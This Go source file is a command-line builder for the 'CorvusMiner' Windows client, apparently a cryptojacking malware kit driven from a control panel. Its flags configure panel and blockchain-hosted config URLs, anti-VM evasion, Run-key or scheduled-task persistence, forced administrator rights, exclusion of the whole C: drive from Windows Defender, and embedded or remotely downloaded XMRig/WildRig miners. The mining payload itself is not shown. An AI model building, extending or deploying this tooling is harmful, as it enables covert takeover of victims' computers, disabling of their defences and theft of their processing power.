// Command builder is the non-interactive Linux builder for the CorvusMiner
// Windows client. It cross-compiles Client/ with MinGW-w64 and accepts every
// build setting as a command line flag (or JSON file) so the panel can drive
// builds programmatically.
package main

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const version = "1.0.0"

const (
	exitOK      = 0
	exitBuild   = 1
	exitUsage   = 2
	exitTimeOut = 124
)

// cliValues holds raw flag values. They are only copied into BuildConfig when
// the user actually set the flag, so a -config file is not clobbered by
// defaults.
type cliValues struct {
	panelURLs         string
	configURLs        string
	contractAddress   string
	embeddedConfig    string
	configFile        string
	antiVM            bool
	persistence       bool
	debugConsole      bool
	adminManifest     bool
	defenderExclusion bool
	cpuMiner          bool
	gpuMiner          bool
	remoteMiners      bool
	monitoring        bool
	output            string
	name              string
	source            string
	toolchain         string
	jobs              int
	timeout           time.Duration
	keepBuild         bool
	dryRun            bool
	jsonOut           bool
	quiet             bool
	showVersion       bool
}

func main() {
	os.Exit(run(os.Args[1:], os.Stdin, os.Stdout, os.Stderr))
}

func run(args []string, stdin io.Reader, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("builder", flag.ContinueOnError)
	fs.SetOutput(stderr)

	var v cliValues
	registerFlags(fs, &v)
	fs.Usage = func() {
		fmt.Fprint(stderr, "CorvusMiner Linux client builder (CLI, no UI).\n")
		fmt.Fprint(stderr, "Cross-compiles Client/ into a Windows executable using MinGW-w64.\n\n")
		fmt.Fprint(stderr, "Usage:\n  builder [options]\n\nOptions:\n")
		fs.PrintDefaults()
		fmt.Fprint(stderr, "\nAt least one of -panel-urls, -config-url or -contract-address is required.\n")
	}

	if err := fs.Parse(args); err != nil {
		if errors.Is(err, flag.ErrHelp) {
			return exitOK
		}
		return exitUsage
	}
	if fs.NArg() > 0 {
		fmt.Fprintf(stderr, "[ERROR] unexpected argument(s): %s\n", strings.Join(fs.Args(), " "))
		return exitUsage
	}
	if v.showVersion {
		fmt.Fprintf(stdout, "corvus builder (linux cli) %s\n", version)
		return exitOK
	}

	cfg := defaultBuildConfig()
	if v.configFile != "" {
		fc, err := loadConfigFile(v.configFile, stdin)
		if err != nil {
			fmt.Fprintf(stderr, "[ERROR] %v\n", err)
			return exitUsage
		}
		fc.apply(&cfg)
	}

	set := map[string]bool{}
	fs.Visit(func(f *flag.Flag) { set[f.Name] = true })
	v.apply(&cfg, set)

	logWriter := stdout
	if v.jsonOut {
		logWriter = stderr
	}
	log := &logger{w: logWriter, quiet: v.quiet}

	if err := cfg.Validate(); err != nil {
		log.Errorf("%v", err)
		if v.jsonOut {
			writeJSON(stdout, Result{Success: false, Error: err.Error()})
		}
		return exitUsage
	}

	clientDir, root, err := resolveClientDir(cfg.Source)
	if err != nil {
		log.Errorf("%v", err)
		if v.jsonOut {
			writeJSON(stdout, Result{Success: false, Error: err.Error()})
		}
		return exitUsage
	}

	log.Infof("CorvusMiner client builder %s", version)
	log.Infof("Source: %s", clientDir)
	log.Infof("Output: %s", absOrSelf(cfg.Output))

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Timeout)
	defer cancel()

	b := &builder{cfg: cfg, root: root, clientDir: clientDir, log: log}
	res, err := b.Run(ctx)
	if err != nil {
		log.Errorf("%v", err)
		if v.jsonOut {
			writeJSON(stdout, res)
		}
		if errors.Is(err, context.DeadlineExceeded) {
			return exitTimeOut
		}
		return exitBuild
	}

	if v.jsonOut {
		writeJSON(stdout, res)
		return exitOK
	}
	if res.Output == "" {
		log.Successf("Dry run complete - no artifact produced")
		return exitOK
	}
	log.Successf("Built %s (%s, sha256 %s) in %.1fs",
		res.Output, humanBytes(res.Bytes), shortHash(res.SHA256), float64(res.DurationMS)/1000)
	return exitOK
}

func registerFlags(fs *flag.FlagSet, v *cliValues) {
	fs.StringVar(&v.panelURLs, "panel-urls", "", "Comma-separated panel submit URL(s) used for POST config mode")
	fs.StringVar(&v.configURLs, "config-url", "", "Comma-separated GET config URL(s); switches the client to GET config mode")
	fs.StringVar(&v.contractAddress, "contract-address", "", "0x... TextStorage contract address; enables on-chain config URL lookup")
	fs.StringVar(&v.embeddedConfig, "embedded-config", "", `Embedded fallback config JSON: "auto" (default), "none" or a file path`)
	fs.StringVar(&v.configFile, "config", "", `JSON build config file ("-" reads stdin); explicit flags override it`)

	fs.BoolVar(&v.monitoring, "monitoring", false, "Accepted for panel compatibility (process monitoring is runtime config, not compile-time)")
	fs.BoolVar(&v.antiVM, "antivm", false, "Enable anti-VM detection")
	fs.BoolVar(&v.persistence, "persistence", false, "Enable persistence (Run key / scheduled task)")
	fs.BoolVar(&v.debugConsole, "debug", false, "Build with a visible debug console")
	fs.BoolVar(&v.adminManifest, "admin", false, "Embed a requireAdministrator manifest")
	fs.BoolVar(&v.defenderExclusion, "defender-exclusion", false, "Add the C: drive to Windows Defender exclusions")
	fs.BoolVar(&v.cpuMiner, "cpu-miner", true, "Embed the CPU miner (XMRig)")
	fs.BoolVar(&v.gpuMiner, "gpu-miner", false, "Embed the GPU miner (WildRig)")
	fs.BoolVar(&v.remoteMiners, "remote-miners", false, "Download miners from the panel instead of only embedding them")

	fs.StringVar(&v.output, "output", "", `Directory for the built binary (default "dist")`)
	fs.StringVar(&v.name, "name", "", `Output file name (default "corvus.exe")`)
	fs.StringVar(&v.source, "source", "", "Path to the Client source directory (default: auto-detect)")
	fs.StringVar(&v.toolchain, "toolchain", "", "Custom CMake toolchain file (default: generated MinGW-w64 toolchain)")
	fs.IntVar(&v.jobs, "jobs", 0, "Parallel compile jobs (default: number of CPUs)")
	fs.DurationVar(&v.timeout, "timeout", 0, "Overall build timeout (default 30m)")

	fs.BoolVar(&v.keepBuild, "keep-build", false, "Keep the staging/build directory instead of deleting it")
	fs.BoolVar(&v.dryRun, "dry-run", false, "Print the resolved configuration and commands without building")
	fs.BoolVar(&v.jsonOut, "json", false, "Emit a single JSON result on stdout (progress goes to stderr)")
	fs.BoolVar(&v.quiet, "quiet", false, "Suppress progress logging")
	fs.BoolVar(&v.showVersion, "version", false, "Print version and exit")
}

func (v *cliValues) apply(c *BuildConfig, set map[string]bool) {
	if set["panel-urls"] {
		c.PanelURLs = v.panelURLs
	}
	if set["config-url"] {
		c.ConfigURLs = v.configURLs
	}
	if set["contract-address"] {
		c.ContractAddress = v.contractAddress
	}
	if set["embedded-config"] {
		c.EmbeddedConfig = v.embeddedConfig
	}
	if set["monitoring"] {
		c.Monitoring = v.monitoring
	}
	if set["antivm"] {
		c.AntiVM = v.antiVM
	}
	if set["persistence"] {
		c.Persistence = v.persistence
	}
	if set["debug"] {
		c.DebugConsole = v.debugConsole
	}
	if set["admin"] {
		c.AdminManifest = v.adminManifest
	}
	if set["defender-exclusion"] {
		c.DefenderExclusion = v.defenderExclusion
	}
	if set["cpu-miner"] {
		c.CPUMiner = v.cpuMiner
	}
	if set["gpu-miner"] {
		c.GPUMiner = v.gpuMiner
	}
	if set["remote-miners"] {
		c.RemoteMiners = v.remoteMiners
	}
	if set["output"] {
		c.Output = v.output
	}
	if set["name"] {
		c.Name = v.name
	}
	if set["source"] {
		c.Source = v.source
	}
	if set["toolchain"] {
		c.Toolchain = v.toolchain
	}
	if set["jobs"] {
		c.Jobs = v.jobs
	}
	if set["timeout"] {
		c.Timeout = v.timeout
	}
	if set["keep-build"] {
		c.KeepBuild = v.keepBuild
	}
	if set["dry-run"] {
		c.DryRun = v.dryRun
	}
}

// ─── Logging ─────────────────────────────────────────────────────────────────

type logger struct {
	w     io.Writer
	quiet bool
}

func (l *logger) Infof(format string, args ...any) {
	if l.quiet {
		return
	}
	fmt.Fprintf(l.w, "[INFO] "+format+"\n", args...)
}

func (l *logger) Warnf(format string, args ...any) {
	fmt.Fprintf(l.w, "[WARNING] "+format+"\n", args...)
}

func (l *logger) Successf(format string, args ...any) {
	if l.quiet {
		return
	}
	fmt.Fprintf(l.w, "[SUCCESS] "+format+"\n", args...)
}

func (l *logger) Errorf(format string, args ...any) {
	fmt.Fprintf(l.w, "[ERROR] "+format+"\n", args...)
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func writeJSON(w io.Writer, res Result) {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	_ = enc.Encode(res)
}

func absOrSelf(p string) string {
	if abs, err := filepath.Abs(p); err == nil {
		return abs
	}
	return p
}

func humanBytes(n int64) string {
	const unit = 1024
	if n < unit {
		return fmt.Sprintf("%d B", n)
	}
	div, exp := int64(unit), 0
	for v := n / unit; v >= unit; v /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(n)/float64(div), "KMGTPE"[exp])
}

func shortHash(h string) string {
	if len(h) > 16 {
		return h[:16]
	}
	return h
}
